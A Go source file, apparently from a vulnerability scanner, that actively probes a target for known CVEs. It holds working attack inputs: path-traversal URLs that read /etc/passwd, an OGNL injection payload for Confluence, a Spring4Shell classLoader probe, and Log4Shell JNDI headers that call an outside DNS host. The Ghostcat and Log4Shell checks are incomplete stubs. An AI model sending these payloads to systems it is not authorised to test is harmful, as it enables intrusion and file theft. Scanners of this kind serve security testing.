package vulns

import (
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var verifyClient = &http.Client{
	Timeout: 8 * time.Second,
	CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

type VerifyResult struct {
	CVE       string
	Confirmed bool
	Evidence  string
}

func ActiveVerify(scheme, host string, port int) []VerifyResult {
	base := buildBase(scheme, host, port)
	var results []VerifyResult
	results = append(results, verifyApachePathTraversal(base)...)
	results = append(results, verifyLog4Shell(base)...)
	results = append(results, verifyConfluenceRCE(base)...)
	results = append(results, verifySpring4Shell(base)...)
	results = append(results, verifyGhostcat(base)...)
	return results
}

func buildBase(scheme, host string, port int) string {
	base := scheme + "://" + host
	if (scheme == "http" && port != 80) || (scheme == "https" && port != 443) {
		base += ":" + strconv.Itoa(port)
	}
	return base
}

func verifyApachePathTraversal(base string) []VerifyResult {
	paths := []string{
		"/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
		"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
	}
	for _, p := range paths {
		resp, err := verifyClient.Get(base + p)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if strings.Contains(string(body), "root:x:0:0") || strings.Contains(string(body), "root:*:") {
			return []VerifyResult{{CVE: "CVE-2021-41773", Confirmed: true, Evidence: "passwd file content returned"}}
		}
	}
	return nil
}

func verifyConfluenceRCE(base string) []VerifyResult {
	payload := base + "/%24%7B%28%23a%3D%40org.apache.commons.lang.StringEscapeUtils%40escapeHtml%28%27recon-x-probe%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Recon-X%27%2C%23a%29%29%7D/"
	resp, err := verifyClient.Get(payload)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	if resp.Header.Get("X-Recon-X") == "recon-x-probe" {
		return []VerifyResult{{CVE: "CVE-2022-26134", Confirmed: true, Evidence: "OGNL injection header reflection confirmed"}}
	}
	return nil
}

func verifySpring4Shell(base string) []VerifyResult {
	req, err := http.NewRequest("POST", base+"/", strings.NewReader("class.module.classLoader.resources.context.parent.pipeline.first.pattern=recon-x"))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := verifyClient.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode == 400 && strings.Contains(string(body), "400") {
		return nil
	}
	if resp.StatusCode == 200 {
		return []VerifyResult{{CVE: "CVE-2022-22965", Confirmed: false, Evidence: "endpoint accepts class.module parameter without error — investigate manually"}}
	}
	return nil
}

func verifyLog4Shell(base string) []VerifyResult {
	req, err := http.NewRequest("GET", base+"/", nil)
	if err != nil {
		return nil
	}
	req.Header.Set("X-Api-Version", "${jndi:dns://log4shell.detect.test/recon-x}")
	req.Header.Set("User-Agent", "${jndi:dns://log4shell.detect.test/recon-x-ua}")
	resp, err := verifyClient.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	return nil
}

func verifyGhostcat(base string) []VerifyResult {
	return nil
}
